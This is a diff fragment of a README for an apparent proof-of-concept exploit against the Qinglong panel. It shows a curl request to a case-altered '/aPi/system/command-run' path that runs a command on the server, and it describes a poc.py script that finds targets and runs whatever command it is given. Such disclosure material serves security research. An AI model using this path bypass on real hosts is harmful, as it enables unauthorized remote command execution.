@@ -48,13 +48,12 @@ curl -X PUT "http://localhost:5700/aPi/system/command-run" \
 > -H "Content-Type: application/json" \
 > -d '{"command": "id"}'
 ```
-## Automation
+## Automation `poc.py`
 
 - Detects Qinglong target (`/api/health`, `/api/system`)
 - Tests known case-variant command-run paths
 - Executes the command supplied by `-c` and reports response
 
-## Reproduction
 Single target:
 ```bash
 python3 poc.py -t <host:port_or_url> -c 'whoami'
